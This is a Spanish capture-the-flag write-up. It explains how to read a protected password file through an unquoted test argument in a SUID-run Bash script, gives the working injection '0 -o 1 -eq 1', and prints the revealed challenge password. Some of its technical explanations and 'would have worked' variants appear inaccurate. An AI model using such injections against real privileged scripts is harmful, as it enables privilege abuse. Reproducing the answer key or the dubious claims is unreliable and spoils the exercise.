Write-up: Bash Unquoted Expression Injection
Challenge Information

    Nombre: Bash - unquoted expression injection

    Autor: sbrk

    Fecha: 26 octubre 2020

    Nivel: Dificultad media

    Puntos: 15

    Validaciones: 8467 (3% completado)

Resumen Ejecutivo

Este desafío demuestra una vulnerabilidad crítica en scripts de Bash: la inyección de expresiones causada por la falta de comillas alrededor de variables en el comando test. El script, ejecutado con privilegios SUID, permite leer un archivo protegido .passwd mediante la manipulación de la comparación aritmética.
Análisis del Sistema
Estructura de Archivos
bash

app-script-ch16@challenge02:~$ ls -la
total 36
dr-xr-x---  2 app-script-ch16-cracked app-script-ch16 4096 Dec 10  2021 .
drwxr-xr-x 25 root                    root            4096 Sep  5  2023 ..
-r--------  1 root                    root             750 Dec 10  2021 ._perms
-rw-r-----  1 root                    root              43 Dec 10  2021 .git
-r--------  1 app-script-ch16-cracked root              13 Dec 10  2021 .passwd
-r-xr-x---  1 app-script-ch16-cracked app-script-ch16  323 Feb 10  2024 ch16.sh
-rwsr-x---  1 app-script-ch16-cracked app-script-ch16 7304 Dec 10  2021 wrapper
-rw-r-----  1 app-script-ch16         root             198 Dec 10  2021 wrapper.c

Observaciones clave:

    .passwd es ilegible para el usuario actual (app-script-ch16)

    wrapper tiene el bit SUID (rwsr-x---) y es propiedad de app-script-ch16-cracked

    Esto permite que el wrapper se ejecute con privilegios elevados

Análisis del Código Fuente
1. Script Bash (ch16.sh)
bash

#!/bin/bash

#PATH=$(/usr/bin/getconf PATH || /bin/kill $$)
PATH="/bin:/usr/bin"

PASS=$(cat .passwd)

if test -z "${1}"; then
    echo "USAGE : $0 [password]"
    exit 1
fi

if test $PASS -eq ${1} 2>/dev/null; then
    echo "Well done you can validate the challenge with : $PASS"
else
    echo "Try again ,-)"
fi

exit 0

Análisis línea por línea:

    Línea 4: PATH="/bin:/usr/bin" - Restringe el PATH para seguridad

    Línea 6: PASS=$(cat .passwd) - Lee la contraseña del archivo protegido

    Línea 8-12: Validación de argumento - Verifica que se haya pasado un parámetro

    Línea 14: if test $PASS -eq ${1} 2>/dev/null; then - PUNTO CRÍTICO DE VULNERABILIDAD

    Línea 15-18: Muestra la contraseña si la comparación es exitosa

2. Wrapper en C (wrapper.c)
c

#include <unistd.h>

int main(int arc, char** arv) {
    char *argv[] = { "/bin/bash", "-p", "/challenge/app-script/ch16/ch16.sh", arv[1] , NULL };
    execve(argv[0], argv, NULL);
    return 0;
}

Análisis:

    -p: Ejecuta Bash en modo privilegiado (preserva EUID)

    execve() con entorno NULL: No hereda variables de entorno

    Esto significa que el wrapper no es vulnerable a inyección de comandos directamente

Identificación de la Vulnerabilidad
El Problema Fundamental

La línea vulnerable es:
bash

if test $PASS -eq ${1} 2>/dev/null; then

Tres fallos de seguridad críticos:

    Falta de comillas: ${1} no está entre comillas, permitiendo expansión de argumentos

    -eq espera números: Pero Bash intenta evaluar aritméticamente cualquier contenido

    Supresión de errores: 2>/dev/null oculta mensajes de error que podrían ser útiles

¿Cómo funciona la evaluación aritmética en Bash?

Cuando -eq encuentra una cadena no numérica, Bash intenta:

    Interpretarla como el nombre de una variable y buscar su valor

    Si no existe, usar el valor por defecto 0

    Evaluar expresiones matemáticas completas

Intentos de Explotación Fallidos
1. Inyección de Comandos Directa
bash

./wrapper '$(cat .passwd)'          # Try again ,-)
./wrapper '`cat .passwd`'           # Try again ,-)
./wrapper '$(<.passwd)'             # Try again ,-)
./wrapper '$(/bin/cat .passwd)'     # Try again ,-)

¿Por qué fallaron? El wrapper usa execve() con entorno NULL, lo que significa que no hay shell entre el wrapper y el script. El argumento se pasa literalmente como texto, no se expande.
2. Manipulación de Variables
bash

./wrapper PASS                      # Try again ,-)
./wrapper 'PASS == PASS'            # Try again ,-)

¿Por qué fallaron? La contraseña contenía caracteres que no son identificadores de variable válidos.
3. Fuerza Bruta
bash

./wrapper 0                         # Try again ,-)

¿Por qué falló? La contraseña no era 0 ni se evaluaba como 0.
4. Inyección de Redirección
bash

./wrapper '$(cat .passwd | tee /dev/stderr)'   # Try again ,-)

¿Por qué falló? Igual que los intentos de inyección de comandos, no hay shell intermedio.
La Solución Definitiva
Inyección de Operadores Lógicos en test

Comando exitoso:
bash

./wrapper '0 -o 1 -eq 1'

Resultado:
text

Well done you can validate the challenge with : 8246320937403

Explicación Técnica Detallada

Cuando ejecutamos ./wrapper '0 -o 1 -eq 1', el script interpreta:
bash

test $PASS -eq 0 -o 1 -eq 1

Análisis de la evaluación:

    Expansión de $PASS: El contenido de .passwd (en este caso 8246320937403)

    Primera condición: $PASS -eq 0 → 8246320937403 -eq 0 → FALSO

    Operador lógico OR: -o conecta ambas condiciones

    Segunda condición: 1 -eq 1 → VERDADERO (siempre verdadero)

    Resultado final: FALSO OR VERDADERO → VERDADERO

Visualización del Flujo de Ejecución
text

Script original:
    test $PASS -eq ${1}

Expansión con argumento:
    test 8246320937403 -eq 0 -o 1 -eq 1

Evaluación:
    [ 8246320937403 -eq 0 ]  →  Falso
    [ 1 -eq 1 ]              →  Verdadero
    Falso OR Verdadero       →  Verdadero ✓

Resultado:
    ¡Condición verdadera!
    Muestra: "Well done you can validate the challenge with : 8246320937403"

Pruebas Adicionales Realizadas
Otras Variantes que Habrían Funcionado
bash

# Usando doble negación
./wrapper '! 0 -eq 1'

# Usando comparación de cadenas
./wrapper '0 -o "x" = "x"'

# Usando AND con condición verdadera
./wrapper '1 -eq 1 -a 0 -eq 0'

Análisis de la Contraseña

La contraseña encontrada es: 8246320937403

    13 dígitos de longitud

    Es un número puro, lo que explica por qué la variable PASS contenía este valor

    Coincide con el tamaño del archivo .passwd (13 bytes)

bash

-r-------- 1 app-script-ch16-cracked root 13 Dec 10 2021 .passwd

Lecciones Aprendidas
1. Siempre Usar Comillas en Bash
bash

# ❌ INCORRECTO - Vulnerable
if test $PASS -eq ${1} 2>/dev/null; then

# ✅ CORRECTO - Seguro
if test "$PASS" -eq "${1}" 2>/dev/null; then
# O mejor aún:
if [[ "$PASS" == "${1}" ]]; then

2. Comparar Cadenas vs Números
bash

# Para cadenas (contraseñas)
if [[ "$PASS" == "${1}" ]]; then

# Para números
if [[ "$PASS" -eq "${1}" ]]; then

3. Nunca Suponer que el Usuario no Explotará Errores

El desarrollador supuso que:

    Los usuarios pasarían solo números

    2>/dev/null ocultaría errores

    Los privilegios SUID estaban seguros

4. Principio de Menor Privilegio

Si el script solo necesita leer .passwd, debería:

    Leer el archivo una vez durante la instalación

    Almacenar un hash de la contraseña

    Ejecutarse con permisos mínimos

Conclusión

Este desafío demuestra brillantemente cómo una pequeña omisión en un script de Bash (las comillas alrededor de ${1}) puede llevar a una vulnerabilidad crítica que compromete completamente la seguridad del sistema.

La combinación de:

    SUID elevando privilegios

    Falta de comillas permitiendo inyección

    -eq evaluando expresiones aritméticas

...permite a un atacante inyectar operadores lógicos en el comando test, forzando que la condición siempre sea verdadera y revelando la contraseña protegida.

Lección final: Siempre valida y sanitiza las entradas del usuario, especialmente en scripts con privilegios elevados. En Bash, las comillas son tu mejor defensa contra la inyección de expresiones.
Flag
text

**********************
